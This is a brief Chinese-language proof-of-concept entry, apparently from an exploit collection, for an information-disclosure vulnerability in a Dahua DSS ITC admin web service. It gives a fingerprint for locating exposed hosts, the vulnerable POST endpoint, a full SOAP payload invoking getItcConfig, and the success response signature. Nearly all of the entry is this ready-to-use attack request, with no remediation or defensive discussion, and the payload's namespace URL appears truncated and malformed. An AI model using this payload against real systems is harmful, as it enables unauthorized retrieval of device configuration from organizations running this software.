# 大华dssictadminoperate信息泄露漏洞

大华 ｜ 信息泄露 ｜ —
- **指纹**：`body="/itc/login_init.action"`
- **请求**：`POST /itc/services/adminOperate HTTP/1.1`

**Payload**
```
<soapenv:Envelope xmlns:soapenv="http://schemas.xmlsoap.org/soap/envelope/%22 xmlns:adm="http://adminoperateservice.webservice.dssc.dahua.c...">
<soapenv:Header/>
<soapenv:Body>
<adm:getItcConfig/>
</soapenv:Body>
</soapenv:Envelope>
```
- **响应特征**：200 soap:Envelope